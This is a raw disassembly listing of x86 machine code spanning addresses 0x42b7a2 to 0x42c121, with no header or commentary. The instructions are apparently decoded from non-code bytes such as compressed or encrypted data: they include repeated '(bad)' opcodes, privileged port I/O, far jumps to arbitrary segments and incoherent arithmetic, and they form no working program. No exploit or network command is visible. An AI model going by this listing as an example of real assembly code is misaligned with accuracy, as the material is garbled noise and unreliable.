  42b7a2:	dec    ecx
  42b7a3:	das    
  42b7a4:	in     eax,0x80
  42b7a6:	jp     0x42b7b2
  42b7a8:	cmp    eax,0x398dc814
  42b7ad:	imul   eax,DWORD PTR [ebp+0x59],0xfffffff9
  42b7b1:	fidivr WORD PTR [edi-0x53]
  42b7b4:	push   esp
  42b7b5:	mov    edx,0xbeb9704c
  42b7ba:	pusha  
  42b7bb:	jne    0x42b75e
  42b7bd:	jbe    0x42b83b
  42b7bf:	push   ebx
  42b7c0:	fstp   st(7)
  42b7c2:	(bad)  
  42b7c3:	loop   0x42b7a0
  42b7c5:	fst    DWORD PTR [edx+0x7b]
  42b7c8:	adc    DWORD PTR [eax+0x0],esp
  42b7cb:	xor    al,0xc2
  42b7cd:	push   ds
  42b7ce:	add    al,0x90
  42b7d0:	jae    0x42b777
  42b7d2:	adc    esi,DWORD PTR [edx+ebx*8-0x1f68d318]
  42b7d9:	adc    al,0x7f
  42b7db:	adc    al,0x35
  42b7dd:	jmp    0x3217:0x9bd5194
  42b7e4:	mov    ebp,0xc1d93b17
  42b7e9:	adc    edi,edi
  42b7eb:	inc    ebx
  42b7ec:	stos   BYTE PTR es:[edi],al
  42b7ed:	inc    edi
  42b7ee:	daa    
  42b7ef:	aas    
  42b7f0:	sub    edx,DWORD PTR [eax+0x2fe857e5]
  42b7f6:	ret    0xcb07
  42b7f9:	and    eax,ebx
  42b7fb:	js     0x42b84c
  42b7fd:	sub    DWORD PTR [edx+0x7a96a048],esi
  42b803:	bound  edi,QWORD PTR [ecx]
  42b805:	xor    al,0xb1
  42b807:	test   BYTE PTR [eax+edx*4+0x78],0x20
  42b80c:	push   cs
  42b80d:	jb     0x42b875
  42b80f:	gs repz dec ecx
  42b812:	xchg   ebx,eax
  42b813:	sub    eax,0x206fd2e3
  42b818:	xor    bl,BYTE PTR ds:0xe92c30e8
  42b81e:	rol    bl,1
  42b820:	mov    WORD PTR [esi+0x34],?
  42b823:	sbb    dh,BYTE PTR [ebx-0x9]
  42b826:	scas   eax,DWORD PTR es:[edi]
  42b827:	lock sbb eax,0x1bf7c200
  42b82d:	out    dx,eax
  42b82e:	mov    eax,ds:0x1e18cff9
  42b833:	mov    ebp,0x8106d5fc
  42b838:	cmp    al,0x6a
  42b83a:	mov    ecx,0x525cb997
  42b83f:	retf   0xd87
  42b842:	mov    ds:0x8626bf58,eax
  42b847:	cmp    eax,0x732cb218
  42b84c:	seto   BYTE PTR [edx+0x65]
  42b850:	popa   
  42b851:	aaa    
  42b852:	cmc    
  42b853:	bound  ebx,QWORD PTR [edi+0x1945d770]
  42b859:	xchg   edx,eax
  42b85a:	in     al,dx
  42b85b:	test   al,0x8c
  42b85d:	mov    esp,0x3314806d
  42b862:	daa    
  42b863:	iret   
  42b864:	inc    ebx
  42b865:	les    ebx,FWORD PTR [edx+0x1f7292a4]
  42b86b:	xchg   esp,eax
  42b86c:	and    BYTE PTR [edx],0x40
  42b86f:	imul   eax,DWORD PTR [esi+0x9ebcda8],0xe9bf30b
  42b879:	sar    DWORD PTR [ebx+0x19114900],0x70
  42b880:	retf   
  42b881:	hlt    
  42b882:	cwde   
  42b883:	sbb    DWORD PTR [edi+eax*1-0x5c],esi
  42b887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b888:	and    al,dl
  42b88a:	xchg   edi,eax
  42b88b:	inc    esi
  42b88c:	sub    ch,BYTE PTR [eax-0x10]
  42b88f:	scas   al,BYTE PTR es:[edi]
  42b890:	icebp  
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebx,DWORD PTR [ecx+0x1d]
  42b902:	loopne 0x42b902
  42b904:	enter  0x1d2,0x0
  42b908:	add    eax,0x75000001
  42b90d:	jmp    0xb356153b
  42b912:	lods   al,BYTE PTR ds:[esi]
  42b913:	mov    ss,WORD PTR [esi]
  42b915:	dec    edi
  42b916:	loop   0x42b8d4
  42b918:	aam    0x99
  42b91a:	pop    eax
  42b91b:	and    edi,esi
  42b91d:	xor    eax,0x149f3fb3
  42b922:	push   es
  42b923:	cmp    al,ah
  42b925:	js     0x42b9a3
  42b927:	or     al,0x23
  42b929:	xchg   edx,eax
  42b92a:	xor    eax,0x11ddc21e
  42b92f:	mov    ecx,0x3be86160
  42b934:	cmp    DWORD PTR [edi+eax*8+0x27],edi
  42b938:	mov    dl,0xf3
  42b93a:	mov    dl,0x22
  42b93c:	aas    
  42b93d:	mov    al,ds:0x608279de
  42b942:	lahf   
  42b943:	mov    ds:0x98eb93b8,eax
  42b948:	push   0x736b7e98
  42b94d:	mov    ecx,0xf52b440d
  42b952:	shl    bl,0x3b
  42b955:	cmp    edi,DWORD PTR [eax+0x37]
  42b958:	mov    ds:0x3d73b651,eax
  42b95d:	das    
  42b95e:	xchg   esp,eax
  42b95f:	dec    edx
  42b960:	stc    
  42b961:	arpl   WORD PTR [ecx-0x62],sp
  42b964:	mov    bl,cl
  42b966:	pusha  
  42b967:	add    DWORD PTR [esi+0x487e8bed],esi
  42b96d:	scas   eax,DWORD PTR es:[edi]
  42b96e:	scas   al,BYTE PTR es:[edi]
  42b96f:	cs leave 
  42b971:	clc    
  42b972:	stc    
  42b973:	jg     0x42b9d6
  42b975:	jp     0x42b903
  42b977:	mov    cl,0x21
  42b979:	adc    al,0xf2
  42b97b:	mov    eax,0x182ee21a
  42b980:	xor    BYTE PTR [edx+ebp*2+0x4d5197f4],ah
  42b987:	lock sbb bl,dl
  42b98a:	and    esp,esi
  42b98c:	xchg   ebp,eax
  42b98d:	add    DWORD PTR [eax-0x4c90bab0],ebp
  42b993:	leave  
  42b994:	aas    
  42b995:	inc    edx
  42b996:	fcom   QWORD PTR [esi+0xf]
  42b999:	cmp    cl,BYTE PTR [ebx+0x60f7119f]
  42b99f:	sub    eax,0xefd9df77
  42b9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9a5:	xchg   esi,eax
  42b9a6:	popa   
  42b9a7:	dec    esi
  42b9a8:	outs   dx,BYTE PTR ds:[esi]
  42b9a9:	or     eax,0x5b590783
  42b9ae:	imul   ebx,DWORD PTR [ecx-0x4bd0867d],0xffffff90
  42b9b5:	sahf   
  42b9b6:	lds    ecx,FWORD PTR [ebx+esi*4-0x26274d90]
  42b9bd:	add    eax,0xc81be1bc
  42b9c2:	pop    ecx
  42b9c3:	fld    st(0)
  42b9c5:	aad    0x63
  42b9c7:	xchg   DWORD PTR [edx-0xb],eax
  42b9ca:	pop    eax
  42b9cb:	ret    
  42b9cc:	fmul   QWORD PTR [eax-0x62]
  42b9cf:	cmc    
  42b9d0:	mov    al,ds:0xaf7924ab
  42b9d5:	shr    BYTE PTR [esi],1
  42b9d7:	fsubr  QWORD PTR [eax+0x33]
  42b9da:	inc    esp
  42b9db:	pop    ds
  42b9dc:	dec    edx
  42b9dd:	inc    esp
  42b9de:	jne    0x42ba07
  42b9e0:	int3   
  42b9e1:	inc    eax
  42b9e2:	or     BYTE PTR [esi],bh
  42b9e4:	adc    ah,bh
  42b9e6:	push   ecx
  42b9e7:	push   ebx
  42b9e8:	pushf  
  42b9e9:	xor    al,0xae
  42b9eb:	jns    0x42ba29
  42b9ed:	gs mov ch,0x3
  42b9f0:	out    dx,eax
  42b9f1:	lods   al,BYTE PTR ds:[esi]
  42b9f2:	mov    dl,0x4c
  42b9f4:	stos   BYTE PTR es:[edi],al
  42b9f5:	mov    edx,0x6b4e426
  42b9fa:	sahf   
  42b9fb:	pop    ebp
  42b9fc:	add    DWORD PTR [ecx+ebp*8-0xeeb8a35],ebp
  42ba03:	ins    DWORD PTR es:[edi],dx
  42ba04:	sub    DWORD PTR [ecx+0x12eaf7e4],esp
  42ba0a:	jns    0x42b9b1
  42ba0c:	inc    ecx
  42ba0d:	test   al,0xc5
  42ba0f:	ret    0x31
	...
  42ba72:	add    BYTE PTR [eax],al
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [esi],edx
  42ba81:	push   cs
  42ba82:	mov    dl,0xd8
  42ba84:	int    0xd3
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0xa3000001
  42ba8d:	push   ebx
  42ba8e:	cmp    dl,cl
  42ba90:	js     0x42ba82
  42ba92:	popf   
  42ba93:	jo     0x42baea
  42ba95:	and    al,cl
  42ba97:	stc    
  42ba98:	xor    BYTE PTR [ebp-0x3d88793],dh
  42ba9e:	add    al,0xe9
  42baa0:	pop    es
  42baa1:	je     0x42bab0
  42baa3:	lea    eax,[esp+edx*1]
  42baa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42baa7:	jge    0x42bb17
  42baa9:	fcom   st(2)
  42baab:	aam    0xb5
  42baad:	mov    bl,dl
  42baaf:	pop    ebp
  42bab0:	pop    ds
  42bab1:	iret   
  42bab2:	sub    edx,DWORD PTR ds:0xde526a69
  42bab8:	icebp  
  42bab9:	mov    DWORD PTR [ecx-0x62],ebx
  42babc:	dec    ebx
  42babd:	inc    eax
  42babe:	push   ebp
  42babf:	out    dx,eax
  42bac0:	dec    esp
  42bac1:	dec    ebx
  42bac2:	jecxz  0x42baba
  42bac4:	mov    bh,0x71
  42bac6:	xor    BYTE PTR [ebp-0x64],0x3f
  42baca:	int    0xb1
  42bacc:	jne    0x42bac5
  42bace:	js     0x42bade
  42bad0:	addr16 sar bl,cl
  42bad3:	jo     0x42baf1
  42bad5:	cmp    DWORD PTR [edi+0x39],ecx
  42bad8:	iret   
  42bad9:	mov    bl,0x4b
  42badb:	sbb    esi,eax
  42badd:	push   ebx
  42bade:	(bad)  
  42badf:	pushf  
  42bae0:	pop    eax
  42bae1:	jbe    0x42bac4
  42bae3:	jbe    0x42bb12
  42bae5:	neg    DWORD PTR [esi+edi*4]
  42bae8:	and    DWORD PTR [eax],edx
  42baea:	jmp    DWORD PTR [edx]
  42baec:	int3   
  42baed:	sti    
  42baee:	mov    BYTE PTR [ecx+0x1b77465f],dh
  42baf4:	dec    esp
  42baf5:	push   ebx
  42baf6:	push   ecx
  42baf7:	bound  ebp,QWORD PTR [ebx-0x4d]
  42bafa:	rcl    DWORD PTR [eax+0x484f3d51],1
  42bb00:	add    eax,0x94fea9b0
  42bb05:	div    esi
  42bb07:	adc    eax,0x75f7bb35
  42bb0c:	xchg   edx,eax
  42bb0d:	mov    DWORD PTR [eax-0x35],esi
  42bb10:	imul   ecx,DWORD PTR [esi-0x18c50698],0xffffffa4
  42bb17:	mov    ah,0xf7
  42bb19:	mov    DWORD PTR [ecx],ecx
  42bb1b:	dec    esp
  42bb1c:	push   esp
  42bb1d:	out    dx,eax
  42bb1e:	inc    ecx
  42bb1f:	jns    0x42bafe
  42bb21:	mov    cl,cl
  42bb23:	cmp    eax,0x331ee599
  42bb28:	test   DWORD PTR [ebp+ebx*1+0x42d14a03],ebp
  42bb2f:	jb     0x42bb28
  42bb31:	ror    BYTE PTR [edi-0x63],1
  42bb34:	imul   ebx,DWORD PTR [ebx-0x73f48ddf],0x6a
  42bb3b:	mov    bl,0x78
  42bb3d:	mov    ch,0x6e
  42bb3f:	push   edi
  42bb40:	mov    bl,al
  42bb42:	add    BYTE PTR [si+0x9],al
  42bb46:	mov    BYTE PTR [ebx],0x28
  42bb49:	mov    eax,0x9400135b
  42bb4e:	(bad)  
  42bb4f:	xlat   BYTE PTR ds:[ebx]
  42bb50:	mov    edi,0x76ec16eb
  42bb55:	push   ds
  42bb56:	and    ebx,edi
  42bb58:	xchg   esp,eax
  42bb59:	push   ss
  42bb5a:	stc    
  42bb5b:	arpl   WORD PTR [edi],bx
  42bb5d:	daa    
  42bb5e:	js     0x42bae0
  42bb60:	inc    ebp
  42bb61:	in     eax,0xb1
  42bb63:	scas   al,BYTE PTR es:[edi]
  42bb64:	inc    ebp
  42bb65:	das    
  42bb66:	xchg   ebx,eax
  42bb67:	clc    
  42bb68:	fwait
  42bb69:	xchg   ecx,eax
  42bb6a:	mov    al,ds:0x74b441b9
  42bb6f:	inc    edx
  42bb70:	mov    bl,ah
  42bb72:	imul   ebx,DWORD PTR [edx],0x5ba02d7c
  42bb78:	sbb    DWORD PTR ds:0xc323602b,0xfa84497e
  42bb82:	jae    0x42bb09
  42bb84:	adc    al,0xe5
  42bb86:	add    al,0x27
  42bb88:	out    dx,eax
  42bb89:	sbb    BYTE PTR [ebp+0x1c6f4af7],al
  42bb8f:	mov    ah,0x8b
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	das    
  42bc01:	jmp    0xd5155f1f
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0x48000001
  42bc0d:	mov    ebp,0x1c59d8ac
  42bc12:	jne    0x42bbbc
  42bc14:	cmp    esi,DWORD PTR [ebp-0x50]
  42bc17:	sbb    al,0x63
  42bc19:	loop   0x42bbca
  42bc1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc1c:	dec    eax
  42bc1d:	mov    eax,0x25c7b528
  42bc22:	je     0x42bbb1
  42bc24:	xor    bh,BYTE PTR [edi+ebx*4-0x2]
  42bc28:	add    DWORD PTR [ecx+0x319ea7c7],esi
  42bc2e:	mov    edi,0xb9ed43e6
  42bc33:	xchg   esi,eax
  42bc34:	xchg   ecx,eax
  42bc35:	sahf   
  42bc36:	mov    ds:0xacd5280,al
  42bc3b:	jno    0x42bc24
  42bc3d:	jb     0x42bbc4
  42bc3f:	(bad)  
  42bc40:	enter  0xfab6,0xc8
  42bc44:	jae    0x42bbdc
  42bc46:	cli    
  42bc47:	retf   
  42bc48:	sbb    edx,esi
  42bc4a:	xchg   ebp,eax
  42bc4b:	fcmovbe st,st(1)
  42bc4d:	mov    bh,0xbc
  42bc4f:	fcom   st(0)
  42bc51:	adc    BYTE PTR [ecx+0x6584e5f8],0x7
  42bc58:	jge    0x42bc5f
  42bc5a:	repnz loopne 0x42bc08
  42bc5d:	lds    edi,FWORD PTR [esi-0x31f2e481]
  42bc63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc64:	(bad)  
  42bc65:	inc    esp
  42bc66:	cmp    DWORD PTR [eax],eax
  42bc68:	jle    0x42bbf4
  42bc6a:	inc    BYTE PTR [edi-0x4]
  42bc6d:	mov    cl,0xad
  42bc6f:	enter  0x3a81,0x38
  42bc73:	jle    0x42bc34
  42bc75:	pop    ebx
  42bc76:	es or  eax,0xc31f83cc
  42bc7c:	xor    eax,edi
  42bc7e:	mov    edx,0xb3483ac7
  42bc83:	(bad)
  42bc87:	add    BYTE PTR [edi-0x2ddede5],ch
  42bc8d:	adc    esi,esi
  42bc8f:	hlt    
  42bc90:	adc    eax,0x849d21a2
  42bc95:	and    BYTE PTR [esi+ebp*4],0x76
  42bc99:	fdiv   QWORD PTR [edx]
  42bc9b:	pop    ebp
  42bc9c:	sub    ebx,esi
  42bc9e:	or     esp,edi
  42bca0:	mov    eax,0xe94be3e8
  42bca5:	rcr    DWORD PTR [ebx+0xa887ec4],1
  42bcab:	or     al,BYTE PTR [esi-0x5b]
  42bcae:	ror    DWORD PTR [edi-0x68],cl
  42bcb1:	push   ss
  42bcb2:	stc    
  42bcb3:	dec    esp
  42bcb4:	mov    ecx,0x660dac54
  42bcb9:	sbb    eax,edi
  42bcbb:	xchg   ebp,eax
  42bcbc:	in     eax,0x23
  42bcbe:	and    DWORD PTR [edi],0xffffffb8
  42bcc1:	stc    
  42bcc2:	out    0xc3,al
  42bcc4:	mov    ah,0xf5
  42bcc6:	in     eax,0x20
  42bcc8:	dec    ecx
  42bcc9:	pop    edi
  42bcca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bccb:	lods   eax,DWORD PTR ds:[esi]
  42bccc:	outs   dx,BYTE PTR ds:[esi]
  42bccd:	sub    DWORD PTR [ecx+eiz*4],esi
  42bcd0:	cmp    al,0x25
  42bcd2:	mov    esi,0x4cb87eb6
  42bcd7:	push   esi
  42bcd8:	pop    edi
  42bcd9:	(bad)  
  42bcda:	jmp    eax
  42bcdc:	sub    al,BYTE PTR [edx]
  42bcde:	clc    
  42bcdf:	mov    BYTE PTR [ebx+0x1d],bl
  42bce2:	push   es
  42bce3:	push   es
  42bce4:	mov    esp,0xef1d1a53
  42bce9:	pop    ebp
  42bcea:	lea    esi,[edi+0x3406f603]
  42bcf0:	push   ebp
  42bcf1:	ss push ecx
  42bcf3:	xchg   esp,edi
  42bcf5:	sti    
  42bcf6:	dec    edx
  42bcf7:	outs   dx,DWORD PTR ds:[esi]
  42bcf8:	dec    ebx
  42bcf9:	int3   
  42bcfa:	sbb    eax,0xa4543eac
  42bcff:	adc    DWORD PTR ds:0xaa33a9a,edi
  42bd05:	xchg   ecx,eax
  42bd06:	jmp    0x42bd83
  42bd08:	add    eax,esi
  42bd0a:	ss retf 0x95c6
  42bd0e:	mov    dl,0xf4
  42bd10:	mov    ebp,0x0
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd8b
  42bd81:	jne    0x42bdd7
  42bd83:	dec    esi
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0xa9000001,al
  42bd8d:	pop    ds
  42bd8e:	fidivr WORD PTR [ebp-0x3b]
  42bd91:	sub    eax,0x66baafa7
  42bd96:	sbb    DWORD PTR [eax],ebx
  42bd98:	mov    bl,0x5a
  42bd9a:	add    ah,BYTE PTR [ebx]
  42bd9c:	xor    al,0x28
  42bd9e:	xchg   ebp,eax
  42bd9f:	shl    DWORD PTR [edx],0xc
  42bda2:	cmp    eax,0x6de8162d
  42bda7:	test   eax,0x81f30741
  42bdac:	(bad)  
  42bdad:	adc    al,0xd0
  42bdaf:	je     0x42bd54
  42bdb1:	push   0x3c
  42bdb3:	enter  0x105b,0x3e
  42bdb7:	int3   
  42bdb8:	fisttp DWORD PTR gs:[edx-0x5b]
  42bdbc:	inc    esp
  42bdbd:	cli    
  42bdbe:	rol    DWORD PTR [ebx],1
  42bdc0:	sub    eax,0xf44b5ae5
  42bdc5:	out    dx,al
  42bdc6:	call   0xb0d8780d
  42bdcb:	es xor bh,bl
  42bdce:	sbb    ebx,DWORD PTR [edx+0x52a854e2]
  42bdd4:	sub    ax,0x30af
  42bdd8:	inc    edi
  42bdd9:	adc    DWORD PTR [ebx],edx
  42bddb:	stos   DWORD PTR es:[edi],eax
  42bddc:	jne    0x42bd83
  42bdde:	jmp    0x42bdec
  42bde0:	pop    esp
  42bde1:	out    dx,al
  42bde2:	jecxz  0x42bdb5
  42bde4:	neg    DWORD PTR [ebx-0x4c4e89c0]
  42bdea:	ins    DWORD PTR es:[edi],dx
  42bdeb:	mov    bh,0xb8
  42bded:	cli    
  42bdee:	sar    DWORD PTR [edx+0x1a],1
  42bdf1:	adc    ch,bh
  42bdf3:	lods   eax,DWORD PTR ds:[esi]
  42bdf4:	dec    edx
  42bdf5:	jne    0x42be2a
  42bdf7:	in     eax,dx
  42bdf8:	sub    dl,BYTE PTR [di-0x2a79]
  42bdfd:	test   esi,eax
  42bdff:	mov    eax,0xa8581ede
  42be04:	and    DWORD PTR [eax+edi*4],ebp
  42be07:	mov    bl,bl
  42be09:	push   ebx
  42be0a:	and    ah,0xb4
  42be0d:	or     ebp,ecx
  42be0f:	or     BYTE PTR [ebx+0x19],cl
  42be12:	xor    al,0xfd
  42be14:	push   0x64773aab
  42be19:	inc    esp
  42be1a:	xor    BYTE PTR [ebx-0xd],0xfe
  42be1e:	into   
  42be1f:	mov    ch,0xa5
  42be21:	mov    edx,0x9aead6da
  42be26:	test   al,0xb1
  42be28:	mov    esi,0x572d417f
  42be2d:	fistp  WORD PTR [esi]
  42be2f:	std    
  42be30:	pop    es
  42be31:	iret   
  42be32:	inc    ebx
  42be33:	add    eax,ecx
  42be35:	jp     0x42be48
  42be37:	mov    cl,BYTE PTR [edx+0x7d6bd84f]
  42be3d:	arpl   WORD PTR [ebx],bx
  42be3f:	outs   dx,DWORD PTR ds:[esi]
  42be40:	jnp    0x42be17
  42be42:	jecxz  0x42be15
  42be44:	std    
  42be45:	or     ah,BYTE PTR [esi+edx*8]
  42be48:	sub    al,0x9
  42be4a:	add    eax,0x8916d768
  42be4f:	pop    ebx
  42be50:	loop   0x42bde1
  42be52:	loope  0x42be1d
  42be54:	popf   
  42be55:	or     ecx,DWORD PTR [ecx+0x68]
  42be58:	stc    
  42be59:	in     eax,0x7e
  42be5b:	jnp    0x42bdf4
  42be5d:	cmp    al,0x79
  42be5f:	push   edi
  42be60:	or     ebx,esp
  42be62:	sbb    BYTE PTR [edi+0x68f33a6c],ch
  42be68:	iret   
  42be69:	in     al,dx
  42be6a:	cmp    al,0x25
  42be6c:	fmul   QWORD PTR [ebx]
  42be6e:	imul   edi,DWORD PTR [esi],0xffffffe6
  42be71:	sbb    cl,BYTE PTR [eax-0x32]
  42be74:	pop    esi
  42be75:	inc    ecx
  42be76:	in     al,dx
  42be77:	(bad)  
  42be79:	(bad)  
  42be7a:	dec    edi
  42be7b:	inc    esp
  42be7c:	int3   
  42be7d:	scas   al,BYTE PTR es:[edi]
  42be7e:	jg     0x42befd
  42be80:	jnp    0x42be7e
  42be82:	xchg   dh,bl
  42be84:	sub    eax,0x6f800266
  42be89:	mov    esi,0x7a837586
  42be8e:	inc    esp
  42be8f:	adc    cl,BYTE PTR [edi+0x0]
	...
  42bef2:	add    BYTE PTR [eax],al
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x3d7bd7c8,eax
  42bf01:	cmp    al,0x95
  42bf03:	mov    ds:0x1d6dc,al
  42bf08:	add    eax,0x69000001
  42bf0d:	aas    
  42bf0e:	cmp    DWORD PTR [esi+0x35],edi
  42bf11:	add    eax,0xa36aee7f
  42bf16:	in     al,0x7c
  42bf18:	sbb    BYTE PTR [ecx],0x45
  42bf1b:	fstp   QWORD PTR [edx+0x63]
  42bf1e:	sahf   
  42bf1f:	nop
  42bf20:	dec    DWORD PTR [edx+esi*1-0xa]
  42bf24:	loope  0x42bf20
  42bf26:	sbb    eax,ecx
  42bf28:	xlat   BYTE PTR ds:[ebx]
  42bf29:	aaa    
  42bf2a:	jo     0x42bf06
  42bf2c:	jmp    0xc97e5879
  42bf31:	shr    ah,1
  42bf33:	adc    ecx,esi
  42bf35:	call   0x7735:0x27f07577
  42bf3c:	pusha  
  42bf3d:	mov    ebx,0x8a902817
  42bf42:	lods   al,BYTE PTR ds:[esi]
  42bf43:	in     eax,0x5b
  42bf45:	cmp    BYTE PTR [ecx+esi*4+0x4f],bl
  42bf49:	cmp    dh,dh
  42bf4b:	inc    esp
  42bf4c:	sub    al,0x8f
  42bf4e:	add    DWORD PTR [edi+0x2e],edx
  42bf51:	out    dx,al
  42bf52:	ror    DWORD PTR [eax],1
  42bf54:	jo     0x42bf5e
  42bf56:	xor    BYTE PTR [ecx+0x5f],al
  42bf59:	ret    0xf4b9
  42bf5c:	cmp    al,0xdb
  42bf5e:	inc    eax
  42bf5f:	aaa    
  42bf60:	ss mov bl,0xba
  42bf63:	push   0x3097c7b0
  42bf68:	jle    0x42bf5d
  42bf6a:	xor    al,0x58
  42bf6c:	nop
  42bf6d:	addr16 aaa 
  42bf6f:	shl    DWORD PTR [ebx],1
  42bf71:	jne    0x42bf37
  42bf73:	in     eax,0x4
  42bf75:	add    eax,0xaefafc3
  42bf7a:	push   0xfffffff9
  42bf7c:	add    dl,BYTE PTR [edi]
  42bf7e:	pushf  
  42bf7f:	sub    esi,0xffffffbb
  42bf82:	rcr    DWORD PTR [ebx-0x33f1ba4],1
  42bf88:	jae    0x42bfd6
  42bf8a:	in     al,dx
  42bf8b:	inc    edx
  42bf8c:	hlt    
  42bf8d:	imul   ebx,DWORD PTR [ecx+0x2d3d122c],0xcf4940dc
  42bf97:	fwait
  42bf98:	jecxz  0x42bfe6
  42bf9a:	sub    eax,0xd292eba2
  42bf9f:	pop    edi
  42bfa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfa1:	sub    al,0x5c
  42bfa3:	adc    edx,DWORD PTR [esi+ecx*8]
  42bfa6:	out    dx,al
  42bfa7:	push   esi
  42bfa8:	add    al,0xae
  42bfaa:	fmul   QWORD PTR [ecx-0x57ff02e4]
  42bfb0:	out    dx,eax
  42bfb1:	push   ss
  42bfb2:	sbb    dh,dl
  42bfb4:	xor    edi,DWORD PTR [edi]
  42bfb6:	push   eax
  42bfb7:	stos   BYTE PTR es:[edi],al
  42bfb8:	(bad)  
  42bfba:	mov    ?,WORD PTR [ebp+0x67e1f1b]
  42bfc0:	stc    
  42bfc1:	adc    BYTE PTR [eax+0x3fe1616f],bh
  42bfc7:	enter  0x2ce8,0x9e
  42bfcb:	icebp  
  42bfcc:	or     DWORD PTR [eax],edx
  42bfce:	in     al,dx
  42bfcf:	ret    0xbe6f
  42bfd2:	sub    dh,dh
  42bfd4:	pusha  
  42bfd5:	fsubr  DWORD PTR [esi-0x7af46c4a]
  42bfdb:	scas   al,BYTE PTR es:[edi]
  42bfdc:	pusha  
  42bfdd:	stc    
  42bfde:	cli    
  42bfdf:	sub    eax,0x43b4d5ae
  42bfe4:	cdq    
  42bfe5:	fist   WORD PTR [edi+0x2ec6ffc1]
  42bfeb:	int3   
  42bfec:	arpl   WORD PTR [ecx],sp
  42bfee:	sub    DWORD PTR [edi-0x22],eax
  42bff1:	(bad)  
  42bff2:	out    0xdd,al
  42bff4:	arpl   WORD PTR ds:0x9d3f54b1,bx
  42bffa:	ret    
  42bffb:	rcr    DWORD PTR [ebp+0x1e71511c],1
  42c001:	out    dx,eax
  42c002:	and    al,0xf
  42c004:	jb     0x42c078
  42c006:	mov    ecx,0x6ef4fcd8
  42c00b:	xlat   BYTE PTR ds:[ebx]
  42c00c:	ficomp DWORD PTR [esi]
  42c00e:	aaa    
  42c00f:	addr16 adc eax,0x0
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	lods   al,BYTE PTR ds:[esi]
  42c081:	ds leave 
  42c083:	nop
  42c084:	loope  0x42c05d
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0xb5000001
  42c08d:	cld    
  42c08e:	outs   dx,DWORD PTR ss:[esi]
  42c090:	jmp    0x2b88:0xaef26771
  42c097:	inc    ebp
  42c098:	pop    si
  42c09a:	popf   
  42c09b:	rcl    DWORD PTR [edx-0x4c],0x5a
  42c09f:	cmp    dh,BYTE PTR [ebx+0x5350f1c]
  42c0a5:	popa   
  42c0a6:	test   eax,0xe2ed7f0b
  42c0ab:	inc    ebp
  42c0ac:	cli    
  42c0ad:	in     eax,0x69
  42c0af:	or     al,0xad
  42c0b1:	sbb    al,BYTE PTR [edi+0x4da70724]
  42c0b7:	sub    eax,0xb11b771a
  42c0bc:	stos   DWORD PTR es:[edi],eax
  42c0bd:	cmp    edx,ebp
  42c0bf:	ins    DWORD PTR es:[edi],dx
  42c0c0:	fnstcw WORD PTR [edi]
  42c0c2:	jg     0x42c0b1
  42c0c4:	mov    dh,0x27
  42c0c6:	pop    ebp
  42c0c7:	xor    edx,DWORD PTR [ebx-0x1a73b5a2]
  42c0cd:	fcom   DWORD PTR [ebx-0x18f9e284]
  42c0d3:	xchg   edx,eax
  42c0d4:	stc    
  42c0d5:	aas    
  42c0d6:	dec    ebp
  42c0d7:	test   al,0x8d
  42c0d9:	hlt    
  42c0da:	or     BYTE PTR [eax],ch
  42c0dc:	(bad)  
  42c0dd:	je     0x42c0d8
  42c0df:	iret   
  42c0e0:	in     eax,0xcf
  42c0e2:	ins    BYTE PTR es:[edi],dx
  42c0e3:	jp     0x42c163
  42c0e5:	in     al,dx
  42c0e6:	fisubr DWORD PTR [esp+eiz*4]
  42c0e9:	push   ds
  42c0ea:	push   es
  42c0eb:	fst    QWORD PTR [eax]
  42c0ed:	fs jb  0x42c13c
  42c0f0:	jmp    0x156a795e
  42c0f5:	clc    
  42c0f6:	push   ds
  42c0f7:	mov    eax,fs
  42c0f9:	push   ecx
  42c0fa:	or     al,0x7f
  42c0fc:	sub    al,0xa2
  42c0fe:	lock cs retf 
  42c101:	and    BYTE PTR [eax+0x7a],bh
  42c104:	outs   dx,DWORD PTR ds:[esi]
  42c105:	js     0x42c0a4
  42c107:	sbb    DWORD PTR [edi-0x51],esp
  42c10a:	pop    edx
  42c10b:	push   es
  42c10c:	in     eax,dx
  42c10d:	mov    esi,0xe9e2b74c
  42c112:	in     al,dx
  42c113:	sbb    cl,al
  42c115:	scas   eax,DWORD PTR es:[edi]
  42c116:	mov    esp,edx
  42c118:	sub    edi,edi
  42c11a:	jne    0x42c109
  42c11c:	(bad)  
  42c11d:	xchg   ecx,eax
  42c11e:	je     0x42c147
  42c120:	push   eax
  42c121:	clc    
